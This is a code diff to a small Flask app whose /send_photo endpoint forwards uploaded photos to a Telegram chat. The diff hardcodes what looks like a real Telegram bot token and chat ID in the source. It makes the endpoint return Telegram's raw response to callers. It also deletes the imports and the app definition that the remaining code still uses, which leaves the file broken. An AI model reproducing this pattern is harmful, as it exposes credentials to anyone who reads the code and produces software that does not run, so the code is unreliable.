@@ -1,16 +1,5 @@
-import os
-import base64
-import requests
-from flask import Flask, render_template, request, jsonify
-
-app = Flask(__name__)
-
-TOKEN = os.environ.get("8354228448:AAF_aDnYtuS__fqolYrWfAKnxh9DvdYCL_Q")
-CHAT_ID = os.environ.get("7757061458")
-
-@app.route('/')
-def index():
-    return render_template('index.html')
+TOKEN = "8354228448:AAF_aDnYtuS__fqolYrWfAKnxh9DvdYCL_Q"
+CHAT_ID = "7757061458"
 
 @app.route('/send_photo', methods=['POST'])
 def send_photo():
@@ -30,7 +19,10 @@ def send_photo():
 
         r = requests.post(url, data=payload, files=files)
 
-        return jsonify({"success": r.status_code == 200})
+        return jsonify({
+            "success": r.status_code == 200,
+            "response": r.text
+        })
 
     except Exception as e:
         return jsonify({"success": False, "message": str(e)}), 500
